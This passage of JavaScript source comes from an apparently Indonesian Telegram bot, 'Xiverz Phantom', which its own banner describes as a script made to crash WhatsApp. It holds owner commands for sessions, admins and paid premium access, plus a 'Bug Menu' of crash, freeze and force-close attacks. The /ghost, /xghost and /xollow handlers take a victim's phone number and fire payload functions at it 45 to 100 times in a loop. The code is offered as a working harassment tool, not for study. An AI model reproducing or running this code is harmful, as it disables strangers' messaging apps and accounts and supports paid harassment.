                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "HTML"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

function readSavedPairing(index) {
    migrateLegacySession(index);
    const credsPath = path.join(getSessionPath(index), 'creds.json');
    if (!fs.existsSync(credsPath)) return null;

    try {
        const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
        const number = creds?.me?.id?.split(':')[0]?.split('@')[0] || '-';
        return {
            registered: Boolean(creds?.registered),
            number
        };
    } catch (error) {
        return { registered: false, number: '-', invalid: true };
    }
}

bot.command(['listpair', 'listpairs', 'sessions'], async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply('❌ ☇ Akses hanya untuk pemilik');
    }

    const rows = [];
    for (let index = 1; index <= MAX_SESSIONS; index++) {
        const saved = readSavedPairing(index);
        const state = sessionStates.get(index);
        const label = getSessionLabel(index);
        const location = `src/${getSessionName(index)}`;

        let status = 'Kosong';
        if (saved?.invalid) status = 'Data rusak';
        else if (activeSessionIndex === index && state?.status === 'open') status = 'Sender aktif';
        else if (state?.status === 'open') status = 'Terhubung standby';
        else if (saved?.registered) status = 'Terdaftar / offline';
        else if (saved) status = 'Belum selesai pairing';

        rows.push(`${label}\n  Nomor: ${saved?.number || '-'}\n  Status: ${status}\n  Folder: ${location}`);
    }

    await ctx.reply(
        `<b>DAFTAR SESSION PAIRING</b>\n\n${rows.join('\n\n')}\n\nTotal slot: ${MAX_SESSIONS}`,
        { parse_mode: 'HTML' }
    );
});

bot.command("reconnect", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = fs.readdirSync(sessionRoot, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && /^session\d*$/.test(entry.name))
      .map((entry) => path.join(sessionRoot, entry.name));

    const legacySessionDirs = fs.readdirSync(__dirname, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && /^session\d*$/.test(entry.name))
      .map((entry) => path.join(__dirname, entry.name));
    let deleted = false;

    for (const dir of [...sessionDirs, ...legacySessionDirs]) {
      fs.rmSync(dir, { recursive: true, force: true });
      deleted = true;
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgc -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgc', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgc -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const keyboardIntervals = {};
const knownPanels = new Map();

function rememberPanel(chatId, messageId, caption) {
  if (!chatId || !messageId || !caption) return;
  knownPanels.set(`${chatId}:${messageId}`, { chatId, messageId, caption });
}

async function updateKnownPanels() {
  const senderStatus = senderConnectionStatus === 'connected'
    ? '1 Connected'
    : senderConnectionStatus === 'reconnecting'
      ? 'Restarting'
      : '0 Connected';
  const senderYesNo = senderConnectionStatus === 'connected'
    ? 'Yes'
    : senderConnectionStatus === 'reconnecting'
      ? 'Restarting'
      : 'No';

  for (const [key, panel] of knownPanels) {
    const updatedCaption = panel.caption
      .replace(/(│✧ Sender: )(?:Yes|No|Restarting)/g, `$1${senderYesNo}`)
      .replace(/(│✧ Sender: )(?:\d+ Connected|Restarting)/g, `$1${senderStatus}`);

    if (updatedCaption === panel.caption) continue;

    try {
      await bot.telegram.editMessageCaption(
        panel.chatId,
        panel.messageId,
        undefined,
        updatedCaption,
        { parse_mode: 'HTML' }
      );
      panel.caption = updatedCaption;
    } catch (error) {
      const description = error?.response?.description || '';
      if (/message to edit not found|message can't be edited|message is not modified/i.test(description)) {
        knownPanels.delete(key);
      }
    }
  }
}

function randomColor() {
  const colors = [

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "success", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "success", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "success", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "success", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "success", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "success", 
                icon_custom_emoji_id: "5265192393757443515"           
            },
        ]
    ],

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "danger", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "danger", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "danger", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "danger", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "danger", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "danger", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ],

    [
        [
            {
                text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂",
                callback_data: "/bug", 
                style: "primary", 
                icon_custom_emoji_id: "5267231489610760977"
            },
            {
                text: "𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂",
                callback_data: "/controls", 
                style: "primary", 
                icon_custom_emoji_id: "5267414691440771593"
            },
        ],
        [
            {
                text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
                url: "https://t.me/AlipzzyOfficiaL", 
                style: "primary", 
                icon_custom_emoji_id: "5267186839130753795"
            },    
        ],
        [ 
            {   text: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                callback_data: "/tqto", 
                style: "primary", 
                icon_custom_emoji_id: "5267198388297810634"
            },
            {
                text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                callback_data: "/tools", 
                style: "primary", 
                icon_custom_emoji_id: "5267199410500028294"
            },
        ],
        [
            {
                text: "𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻", 
                url: "https://t.me/XiverzPhantomTeam", 
                style: "primary", 
                icon_custom_emoji_id: "5265192393757443515"         
            },
        ]
    ]

  ];

  return colors[Math.floor(Math.random() * colors.length)];
}

function startBlink(ctx, chatId, messageId) {

  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
  }

  keyboardIntervals[chatId] = setInterval(async () => {
    try {

      await ctx.telegram.editMessageReplyMarkup(
        chatId,
        messageId,
        undefined,
        {
          inline_keyboard: randomColor()
        }
      );

    } catch {}

  }, 2500);
}

function stopBlink(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}


bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗦𝗧𝗔𝗧𝗨𝗦 ───═⬡
│✧ Sender: ${senderStatus}
│✧ Runtime: ${runtimeStatus}
│✧ Memory: ${memoryStatus}
│✧ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

const sent = await ctx.replyWithPhoto(videoUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: randomColor()
    }
  });

  const chatId = ctx.chat.id;
  rememberPanel(chatId, sent.message_id, menuMessage);
  startBlink(ctx, chatId, sent.message_id);
});

bot.action('/start', async (ctx) => {
    try {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const menuMessage = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗦𝗧𝗔𝗧𝗨𝗦 ───═⬡
│✧ Sender: ${senderStatus}
│✧ Runtime: ${runtimeStatus}
│✧ Memory: ${memoryStatus}
│✧ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡</blockquote>`;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: videoUrl,
        caption: menuMessage,
        parse_mode: "HTML"
      },
      {
        reply_markup: {
          inline_keyboard: randomColor()
        }
      }
    );

    rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, menuMessage);
    startBlink(ctx, ctx.chat.id, ctx.callbackQuery.message.message_id);

    await ctx.answerCbQuery();

  } catch (error) {
    await ctx.answerCbQuery();
  }
});

bot.action('/controls', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const controlsMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝗹 𝗠𝗲𝗻𝘂 ───═⬡
│✧ /connect
│╰─➤ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /reconnect
│╰─➤ ʀᴇsᴇᴛ sᴇssɪᴏɴ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /listpair
│╰─➤ ʟɪsᴛ sᴇssɪᴏɴ ᴘᴀɪʀɪɴɢ
│✧ /setcd
│╰─➤ sᴇᴛᴛɪɴɢs ᴄᴏᴏʟᴅᴏᴡɴ ʙᴏᴛ
│✧ /addadmin
│╰─➤ ᴀᴅᴅ ᴀᴄᴄᴇss ᴀᴅᴍɪɴ
│✧ /deladmin 
│╰─➤ ʀᴇᴍᴏᴠᴇ ᴀᴄᴄᴇss ᴀᴅᴍɪɴ
│✧ /addprem
│╰─➤ ᴀᴅᴅ ᴀᴄᴄᴇss ᴘʀᴇᴍɪᴜᴍ
│✧ /delprem
│╰─➤ ʀᴇᴍᴏᴠᴇ ᴀᴄᴄᴇss ᴘʀᴇᴍɪᴜᴍ
│✧ /spotify
│╰─➤ sᴇᴀʀᴄʜ ʟᴀɢᴜ
╰═─────────────═⬡</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, controlsMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const bugMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂  ───═⬡
│✧ /ghost 
│╰─➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ ɪɴᴠɪsɪʙʟᴇ
│✧ /xghost 
│╰─➤ ᴅᴇʟᴀʏ ʙʀᴜᴛᴀʟɪᴛʏ
│✧ /xollow 
│╰─➤ ᴄʀᴀsʜ ᴍᴇssᴀɢᴇ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xlite
│╰─➤ ғʀᴇᴇᴢᴇ x ʙʟᴀɴᴋ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xburn
│╰─➤ ғᴏʀᴄᴇ ᴄʟᴏsᴇ ɪᴏs ɪɴᴠɪsɪʙʟᴇ
╰═─────────────═⬡

╭═───⊱ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂  ───═⬡
│✧ /xban
│╰─➤ ʙᴀɴɴᴇᴅ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /xslash
│╰─➤ ᴄʀᴀsʜ ɪɴᴠɪsɪʙʟᴇ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, bugMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const toolsMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ───═⬡
│✧ /cekid
│╰─➤ ᴄʜᴇᴄᴋ ɪᴅ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
│✧ /testfunc
│╰─➤ ᴛᴇsᴛ ғᴜɴᴄᴛɪᴏɴ ᴡʜᴀᴛsᴀᴘᴘ
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, toolsMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const tqtoMenu = `
<blockquote>مرحباً "${ctx.from.first_name}"، هذا سكربت مُصمَّم للتسبب في تعطل تطبيق واتساب؛ لذا استخدمه بحكمة، ولا تتسبب في تعطيل حساب أي شخص بريء.

╭═───⊱ 𝗫𝗶𝘃𝗲𝗿𝘇 𝗣𝗵𝗮𝗻𝘁𝗼𝗺 ───═⬡
│✧ Developer: @AlipzzyOfficiaL 
│✧ Version: VIP
│✧ Prefix: /
│✧ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ───═⬡
│✧ AlipzzyOfficiaL
│╰─➤ Developer
│✧ Yuukey
│╰─➤ Team Project
│✧ Dimzzzxzz
│╰─➤ Team Project
│✧ Danzvorever
│╰─➤ Team Project
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        rememberPanel(ctx.chat.id, ctx.callbackQuery.message.message_id, tqtoMenu);
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("cekid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekid https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
│ ✧ Name
│ ╰─➤ ${subject}
│ ✧ Group ID
│ ╰─➤ ${groupId}
│ ✧ Owner
│ ╰─➤ ${owner}
│ ✧ Members
│ ╰─➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ghost 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: ghost
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 45; i++) {
    await XvZDelay(sock, target);
    await XvZDelayV1(sock, target);
    await XvZDelayV2(sock, target);
    await sleep(2500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: ghost
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xghost 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xghost
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await XvZDelay(sock, target);
    await XvZDelayV1(sock, target);
    await XvZDelayV2(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xghost
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xollow 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xollow
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
    await XvZFc(sock, target);
    await XvZFcV1(sock, target);
    await XvZFcV2(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xollow
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xlite 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
